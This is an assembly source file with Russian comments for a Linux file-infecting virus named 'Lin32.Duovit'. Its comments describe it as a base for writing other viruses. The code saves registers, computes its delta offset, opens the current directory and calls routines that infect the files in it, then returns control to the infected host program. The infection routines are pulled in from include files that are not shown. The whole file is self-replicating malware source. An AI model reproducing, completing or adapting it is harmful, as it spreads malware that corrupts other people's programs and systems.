;Вирус под Линух. Цель - не написание крутого виря, а написание
;базы для других вирусов
;Кому спасибо: iron/tpoc, ct757/tpoc
BITS32
section .text
%include "macros.inc";тут макросы
%include "defines.inc";тут определения
;%define DEBUGVER 1;для отладки
global _start
_start:
;==========сохранение регистров
pushad
pushfd
;========================================

;==========резервирование местав стэке для переменных
sub esp,STACK_RESERVE
mov edi,esp
;=========================================================================

;=======================ищем дельту
call deltas
delta db "Lin32.Duovit by FreeMan[TPOC] 26.11.2005",0ah,0dh
curdir db ".",0
deltas:
pop ebp
;========================================

;========заразить текущую директорию
lea ebx,[curdir-delta+ebp]
call infthisdir
;=================================================

mov eax,4
one ebx
mov ecx,ebp
mov edx,deltas-delta
int 80h

exit1
;========восстановить регистры и стэк
add esp, STACK_RESERVE
popfd
popad
;=================================================

;=======вернуть управление носителю 
db 068h
addr dd exitnorm
ret
;================================================

;========в первом поколении
exitnorm
xchg ebx,eax
one eax
int 80h
;===================================


;=======заражение директории (в ebx)
infthisdir

;=====открыть директорию
mov ecx,0200000h
call openfl
mov [dfd],eax
null ebx
cmp eax,ebx
%ifdef DEBUGVER
jns diropened
errors "Cannot open dir", prerrfl, openflerr
diropened
cmp eax,ebx
%endif
js exit1
;=================================

;=======заразить файлы в этой директории
mov ebx,eax
lea ecx,[dirent]
call infectdir
;======================================================

;=======закрыть директорию
exit
mov ebx,[dfd]
call closefl
;===================================
ret
;===================================

;======раскиданые по файлам подпрограммы
%include "check.inc"
%include "align.inc"
%include "infector.inc"
%include "search.inc"
;========================================================

vrsize equ (($-_start)+15)&(~15)
section .data
section .bss 
section .stack